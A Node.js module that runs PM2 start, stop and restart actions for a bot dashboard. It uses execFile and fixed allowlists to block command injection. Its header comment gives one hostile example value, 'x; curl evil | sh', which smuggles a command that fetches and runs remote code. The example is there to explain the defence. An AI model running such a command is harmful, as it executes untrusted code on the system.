/**
 * Safe PM2 service control.
 *
 * All commands are run through execFile with an argument array (no shell), and
 * both the service name and action are resolved against fixed allowlists, so a
 * hostile serviceName such as "x; curl evil | sh" cannot inject a command.
 *
 * @module utils/pm2-service
 */

const { execFile } = require('child_process');
const util = require('util');

const execFilePromise = util.promisify(execFile);

// Canonical PM2 app name for the bot (matches ecosystem.config.js). Overridable
// via env for non-standard deployments.
const BOT_PM2_APP_NAME = process.env.PM2_APP_NAME || 'aszune-ai';

// Accepted service identifiers the dashboard may send → canonical PM2 app name.
const SERVICE_NAME_ALIASES = {
  'aszune-ai-bot': BOT_PM2_APP_NAME,
  'aszune-ai': BOT_PM2_APP_NAME,
  'aszune-bot': BOT_PM2_APP_NAME,
};

const VALID_ACTIONS = ['start', 'stop', 'restart'];

// Quick-action groups → fixed, safe pm2 argument arrays.
const QUICK_ACTION_ARGS = {
  'restart-all': ['restart', 'all'],
  'start-all': ['start', 'all'],
  // Restarting all avoids stopping the bot (which would kill the dashboard).
  'stop-non-essential': ['restart', 'all'],
};

const DEFAULT_TIMEOUT_MS = 10000;

/**
 * Resolve a dashboard-supplied service name to a canonical PM2 app name.
 * @param {string} serviceName
 * @returns {string|null} Canonical app name, or null if not allowlisted
 */
function resolvePm2AppName(serviceName) {
  if (typeof serviceName !== 'string') return null;
  return SERVICE_NAME_ALIASES[serviceName] || null;
}

/**
 * @param {string} action
 * @returns {boolean} Whether the action is one of start/stop/restart
 */
function isValidAction(action) {
  return VALID_ACTIONS.includes(action);
}

/**
 * Run a start/stop/restart against the bot's PM2 process.
 * @param {string} serviceName - Dashboard-supplied service identifier
 * @param {string} action - start | stop | restart
 * @param {Object} [options] - execFile options (e.g. timeout)
 * @returns {Promise<string>} Command stdout
 * @throws {Error} If the service name or action is not allowlisted
 */
async function runPm2ServiceAction(serviceName, action, options = {}) {
  const appName = resolvePm2AppName(serviceName);
  if (!appName) {
    throw new Error(`Unknown or disallowed service: ${serviceName}`);
  }
  if (!isValidAction(action)) {
    throw new Error(`Invalid action: ${action}. Must be one of: ${VALID_ACTIONS.join(', ')}`);
  }

  const { stdout } = await execFilePromise('pm2', [action, appName], {
    timeout: DEFAULT_TIMEOUT_MS,
    ...options,
  });
  return stdout || `Successfully ${action}ed ${appName}`;
}

/**
 * Run a predefined quick action group.
 * @param {string} group - Quick action group name
 * @param {Object} [options] - execFile options
 * @returns {Promise<{stdout: string, stderr: string}>}
 * @throws {Error} If the group is not allowlisted
 */
async function runPm2QuickAction(group, options = {}) {
  const args = QUICK_ACTION_ARGS[group];
  if (!args) {
    throw new Error(`Unknown quick action group: ${group}`);
  }
  return execFilePromise('pm2', args, { timeout: DEFAULT_TIMEOUT_MS, ...options });
}

module.exports = {
  BOT_PM2_APP_NAME,
  VALID_ACTIONS,
  resolvePm2AppName,
  isValidAction,
  runPm2ServiceAction,
  runPm2QuickAction,
};
